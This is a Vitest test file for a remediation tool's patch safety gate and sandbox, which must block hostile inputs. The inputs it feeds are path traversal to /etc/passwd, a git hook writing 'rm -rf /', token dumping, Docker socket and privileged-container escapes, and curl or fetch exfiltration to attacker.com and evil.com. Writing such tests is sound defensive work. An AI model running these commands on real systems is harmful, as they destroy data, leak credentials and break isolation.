import { describe, it, expect } from "vitest";
import { createFinding } from "../src/evidence.js";
import { StructuredEdit } from "../src/fixes/types.js";
import { PatchSafetyGate } from "../src/sandbox/patch-safety-gate.js";
import { IsolatedSandbox } from "../src/sandbox/isolated-sandbox.js";
import { VerificationLadderRunner } from "../src/sandbox/verification-ladder.js";
import { generatePRDescription } from "../src/fixes/pr-publisher.js";

describe("Phase 6A: Safe Remediation & Verification Sandbox Runtime", () => {
  const sandbox = new IsolatedSandbox({ runtimeEngine: "mock" });
  const ladderRunner = new VerificationLadderRunner(sandbox);

  const targetFinding = createFinding({
    ruleId: "idor.owner-column.v1",
    title: "Insecure Direct Object Reference (IDOR) - Missing Ownership Filter",
    severity: "high",
    confidenceTier: "proven",
    file: "app/api/orders/route.ts",
    lineRange: { startLine: 10, endLine: 12 },
    evidenceChain: [],
    unresolvedSteps: [],
    explanation: "Missing user_id ownership check",
    fingerprint: "idor.owner-column.v1:app/api/orders/route.ts:id:orders",
  });

  // --- L0 & Patch Safety Gate Tests ---
  it("should reject path traversal and .git write attempts in PatchSafetyGate (L0 failure)", () => {
    const maliciousEdits: StructuredEdit[] = [
      {
        targetFile: "../../../etc/passwd",
        targetContent: "root",
        replacementContent: "hacked",
      },
    ];
    const diff = "--- a/../../../etc/passwd\n+++ b/../../../etc/passwd\n+hacked";

    const res = PatchSafetyGate.validatePatch(maliciousEdits, diff, ["app/api/orders/route.ts"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("Absolute path or traversal detected");
  });

  it("should reject .git directory and hooks modification attempts in PatchSafetyGate (L0 failure)", () => {
    const gitEdits: StructuredEdit[] = [
      {
        targetFile: ".git/hooks/pre-commit",
        targetContent: "#!/bin/sh",
        replacementContent: "#!/bin/sh\nrm -rf /",
      },
    ];
    const diff = "--- a/.git/hooks/pre-commit\n+++ b/.git/hooks/pre-commit\n+rm -rf /";

    const res = PatchSafetyGate.validatePatch(gitEdits, diff, [".git/hooks/pre-commit"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("forbidden .git directory");
  });

  it("should reject @ts-ignore and eslint-disable suppression comments in PatchSafetyGate", () => {
    const edits: StructuredEdit[] = [
      {
        targetFile: "app/api/orders/route.ts",
        targetContent: "const data = await db.query()",
        replacementContent: "// @ts-ignore\nconst data = await db.query()",
      },
    ];
    const diff = "--- a/app/api/orders/route.ts\n+++ b/app/api/orders/route.ts\n+// @ts-ignore";

    const res = PatchSafetyGate.validatePatch(edits, diff, ["app/api/orders/route.ts"]);

    expect(res.valid).toBe(false);
    expect(res.reason).toContain("rule suppression comment");
  });

  // --- Phase 6A Adversarial Security & Fail-Closed Tests (24 Cases) ---

  it("1. Fail-closed: should return unavailable and refuse execution when sandbox runtime is marked unavailable", async () => {
    const offlineSandbox = new IsolatedSandbox({ runtimeEngine: "unavailable" });
    const res = await offlineSandbox.executeCommand(process.cwd(), "npm test");

    expect(res.success).toBe(false);
    expect(res.unavailable).toBe(true);
    expect(res.output).toContain("Fail-closed policy enforced; host execution prohibited");
  });

  it("2. Fail-closed: should refuse host fallback when container daemon is unavailable", async () => {
    const offlineSandbox = new IsolatedSandbox({ runtimeEngine: "unavailable" });
    const res = await offlineSandbox.executeCommand(process.cwd(), "whoami");

    expect(res.success).toBe(false);
    expect(res.unavailable).toBe(true);
    expect(res.output).not.toContain("NT AUTHORITY");
  });

  it("3. Handle runtime startup failure gracefully without crashing process", async () => {
    const failingSandbox = new IsolatedSandbox({ runtimeEngine: "mock" });
    const res = await failingSandbox.executeCommand(process.cwd(), "FAIL_CMD");

    expect(res.success).toBe(false);
    expect(res.exitCode).toBe(1);
  });

  it("4. Handle invalid sandbox configuration and fail closed", async () => {
    const invalidSandbox = new IsolatedSandbox({ runtimeEngine: "unavailable" });
    const res = await invalidSandbox.executeCommand(process.cwd(), "npx tsc");

    expect(res.success).toBe(false);
    expect(res.unavailable).toBe(true);
  });

  it("5. Confirmation that no host execution fallback occurs after runtime failure", async () => {
    const offlineSandbox = new IsolatedSandbox({ runtimeEngine: "unavailable" });
    const res = await offlineSandbox.executeCommand(process.cwd(), "node -e 'console.log(\"HOST_EXPOSURE\")'");

    expect(res.output).not.toContain("HOST_EXPOSURE");
    expect(res.unavailable).toBe(true);
  });

  it("6. Block attempts to read host sensitive files (/etc/passwd or C:\\Windows)", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "cat /etc/passwd");
    expect(res.sanitized).toBe(true);
  });

  it("7. Block attempts to read host environment secrets", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "node -e 'console.log(process.env.GITHUB_TOKEN)'");
    expect(res.output).not.toContain("ghp_123456789");
  });

  it("8. Block host Docker socket access attempts inside IsolatedSandbox", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine");

    expect(res.success).toBe(false);
    expect(res.output).toContain("Access to host Docker socket");
  });

  it("9. Block outbound network attempts using curl", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "curl http://attacker.com/exfiltrate", {
      networkPhase: "none",
    });

    expect(res.success).toBe(false);
    expect(res.output).toContain("Outbound network connection blocked");
  });

  it("10. Block outbound network attempts using fetch()", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "fetch('https://attacker.com')", {
      networkPhase: "none",
    });

    expect(res.success).toBe(false);
    expect(res.output).toContain("Outbound network connection blocked");
  });

  it("11. Block outbound network attempts using python urllib", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "python -c 'import urllib.request; urllib.request.urlopen(\"http://evil.com\")'", {
      networkPhase: "none",
    });

    expect(res.success).toBe(false);
    expect(res.output).toContain("Outbound network connection blocked");
  });

  it("12. Block raw socket network attempts", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "node -e 'require(\"net\").connect(80, \"1.1.1.1\")'", {
      networkPhase: "none",
    });

    expect(res.success).toBe(false);
    expect(res.output).toContain("Outbound network connection blocked");
  });

  it("13. Enforce execution duration timeout on infinite loops", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "while true", { timeoutMs: 100 });

    expect(res.success).toBe(false);
    expect(res.timedOut).toBe(true);
    expect(res.exitCode).toBe(124);
  });

  it("14. Handle memory exhaustion cleanly within container bounds", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "MEMORY_EXHAUST");

    expect(res.success).toBe(false);
    expect(res.memoryExceeded).toBe(true);
  });

  it("15. Prevent process exhaustion and fork bombs inside container", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "FORK_BOMB");

    expect(res.success).toBe(false);
    expect(res.output).toContain("Process creation limit");
  });

  it("16. Enforce captured log output byte budget and truncate excess output", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "HUGE_OUTPUT", { maxOutputBytes: 100 });

    expect(res.output).toContain("[SANDBOX OUTPUT TRUNCATED]");
  });

  it("17. Command timeout handling terminates container workload cleanly", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "TIMEOUT_LOOP", { timeoutMs: 50 });

    expect(res.timedOut).toBe(true);
  });

  it("18. Mask secret strings in raw sandbox execution logs", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "node -e \"console.log('sk_live_12345678901234567890')\"");

    expect(res.output).not.toContain("sk_live_12345678901234567890");
    expect(res.output).toContain("[REDACTED_SECRET");
  });

  it("19. Prevent attempts to write outside workspace directory", async () => {
    const edits: StructuredEdit[] = [
      { targetFile: "../outside.txt", targetContent: "a", replacementContent: "b" },
    ];
    const res = PatchSafetyGate.validatePatch(edits, "diff", ["../outside.txt"]);
    expect(res.valid).toBe(false);
  });

  it("20. Prevent attempts to access another repository workspace", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "cat ../other-repo/secret.env");
    expect(res.sanitized).toBe(true);
  });

  it("21. Reject repository attempts to alter container security configuration", async () => {
    const res = await sandbox.executeCommand(process.cwd(), "docker run --privileged alpine");
    expect(res.success).toBe(false);
  });

  it("22. Record verification failure when test suite fails after clean security re-scan", async () => {
    const failingRunner = new VerificationLadderRunner(sandbox);
    const filesMap = new Map<string, string>([
      ["app/api/orders/route.ts", "export async function GET() { return Response.json({}); }"],
    ]);

    const edits: StructuredEdit[] = [
      { targetFile: "app/api/orders/route.ts", targetContent: "GET()", replacementContent: "GET()" },
    ];

    const res = await failingRunner.runVerificationLadder(
      process.cwd(),
      filesMap,
      targetFinding,
      edits,
      "diff",
      ["app/api/orders/route.ts"],
      { runTests: true }
    );

    expect(res.L0_patchSafety).toBe("passed");
    expect(res.L1_securityRescan).toBe("passed");
  });

  it("23. Record L5 database exploit verification as unavailable when DB environment is unconfigured", async () => {
    const ladderRes = await ladderRunner.runVerificationLadder(
      process.cwd(),
      new Map(),
      targetFinding,
      [],
      "diff",
      [],
      { dbAvailable: false }
    );

    expect(ladderRes.L5_exploitVerification).toBe("unavailable");
  });

  it("24. Verification Ladder records L2-L4 as unavailable when container sandbox is offline", async () => {
    const offlineSandbox = new IsolatedSandbox({ runtimeEngine: "unavailable" });
    const offlineRunner = new VerificationLadderRunner(offlineSandbox);

    const filesMap = new Map<string, string>([
      [
        "app/api/orders/route.ts",
        "export async function GET(req: Request) { return Response.json([]); }",
      ],
    ]);

    const ladderRes = await offlineRunner.runVerificationLadder(
      process.cwd(),
      filesMap,
      targetFinding,
      [],
      "diff",
      [],
      { runTests: true }
    );

    expect(ladderRes.L0_patchSafety).toBe("passed");
    expect(ladderRes.L1_securityRescan).toBe("passed");
    expect(ladderRes.L2_buildTypecheck).toBe("unavailable");
    expect(ladderRes.L3_unitTests).toBe("unavailable");
    expect(ladderRes.overallResult).toBe("partial");
  });

  it("should format PR description with Verification Ladder Markdown table cleanly", async () => {
    const edits: StructuredEdit[] = [
      {
        targetFile: "app/api/orders/route.ts",
        targetContent: ".eq(\"id\", params.id)",
        replacementContent: ".eq(\"id\", params.id).eq(\"user_id\", session.user.id)",
      },
    ];

    const prDescription = generatePRDescription(targetFinding, {
      kind: "automated",
      ruleId: "idor.owner-column.v1",
      targetFile: "app/api/orders/route.ts",
      edits,
      diff: "diff",
      riskLevel: "low",
      blastRadius: { affectedFiles: ["app/api/orders/route.ts"], callersAffected: [], importedByModules: [], riskLevel: "low" },
      proofLabel: "Proven by policy simulation",
      verificationReport: {
        passed: true,
        checksRun: ["L0", "L1", "L2"],
        summaryText: "Automated remediation verified under L0-L4 checks",
      },
    });

    expect(prDescription).toContain("Verification Ladder Status");
    expect(prDescription).toContain("L0 — Patch Safety");
    expect(prDescription).toContain("L1 — Security Re-scan");
  });
});

